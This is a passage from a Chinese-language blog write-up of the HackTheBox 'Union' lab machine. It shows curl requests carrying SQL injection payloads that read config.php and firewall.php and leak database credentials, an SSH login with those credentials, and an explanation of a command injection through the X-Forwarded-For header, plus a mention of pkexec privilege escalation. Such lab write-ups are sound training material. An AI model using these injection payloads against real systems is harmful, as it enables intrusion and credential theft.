+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ curl -X POST http://10.10.11.128 -d <span class="hljs-string">&quot;player=&#x27; union select load_file(&#x27;/var/www/html/config.php&#x27;);-- -&quot;</span><br>Sorry, &lt;?php<br>  session_start();<br>  <span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>  <span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;uhc&quot;</span>;<br>  <span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;uhc-11qual-global-pw&quot;</span>;<br>  <span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;november&quot;</span>;<br><br>  <span class="hljs-variable">$conn</span> = new mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br>?&gt;<br> you are not eligible due to already qualifying.                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackThebox$ <br></code></pre></td></tr></table></figure>
+
+<p>可以连:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ ssh uhc@10.10.11.128                   <br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.128 (10.10.11.128)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:hE6H4DrsHebfs+gclhz9SL77tMpy8aKR3vp8Y0NRDvY.</span><br><span class="hljs-string">This host key is known by the following other names/addresses:</span><br><span class="hljs-string">    ~/.ssh/known_hosts:22: [hashed name]</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.128<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">uhc@10.10.11.128&#x27;</span>s password: <br>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>0 updates can be applied immediately.<br><br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br><br>Last login: Mon Nov  8 21:19:42 2021 from 10.10.14.8<br>uhc@union:~$ <br></code></pre></td></tr></table></figure>
+
+<p>没有sudo,可以利用pkexec漏洞提权。当然作者还留了一条路，firewall.php还没利用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ curl -X POST http://10.10.11.128 -d <span class="hljs-string">&quot;player=&#x27; union select load_file(&#x27;/var/www/html/firewall.php&#x27;);-- -&quot;</span><br>Sorry, &lt;?php<br>require(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;Authenticated&#x27;</span>])) &#123;<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Access Denied&quot;</span>;<br>  <span class="hljs-built_in">exit</span>;<br>&#125;<br><br>?&gt;<br>&lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;bootstrap-css&quot;</span>&gt;<br>&lt;script src=<span class="hljs-string">&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;!------ Include the above <span class="hljs-keyword">in</span> your HEAD tag ----------&gt;<br><br>&lt;div class=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>                &lt;h1 class=<span class="hljs-string">&quot;text-center m-5&quot;</span>&gt;Join the UHC - November Qualifiers&lt;/h1&gt;<br><br>        &lt;/div&gt;<br>        &lt;section class=<span class="hljs-string">&quot;bg-dark text-center p-5 mt-4&quot;</span>&gt;<br>                &lt;div class=<span class="hljs-string">&quot;container p-5&quot;</span>&gt;<br>&lt;?php<br>  <span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br>  &#125;;<br>  system(<span class="hljs-string">&quot;sudo /usr/sbin/iptables -A INPUT -s &quot;</span> . <span class="hljs-variable">$ip</span> . <span class="hljs-string">&quot; -j ACCEPT&quot;</span>);<br>?&gt;<br>              &lt;h1 class=<span class="hljs-string">&quot;text-white&quot;</span>&gt;Welcome Back!&lt;/h1&gt;<br>              &lt;h3 class=<span class="hljs-string">&quot;text-white&quot;</span>&gt;Your IP Address has now been granted SSH Access.&lt;/h3&gt;<br>                &lt;/div&gt;<br>        &lt;/section&gt;<br>&lt;/div&gt;<br> you are not eligible due to already qualifying.                                                                                                                                                                                                                                                                                 <br></code></pre></td></tr></table></figure>
+
+<p>这很明显存在命令注入，直接将IP利用 “;”拼接就好了，接收的是HTTP数据包中的 X_FORWARDED_FOR 字段，只要到协议包里添加就好了。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Union</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Union/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crazyinside</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Shocker/" title="HackTheBox-shocker">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-shocker</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/Tryhackme-Daily-Bugle/" title="Tryhackme-Daily Bugle">
+                        <span class="hidden-mobile">Tryhackme-Daily Bugle</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
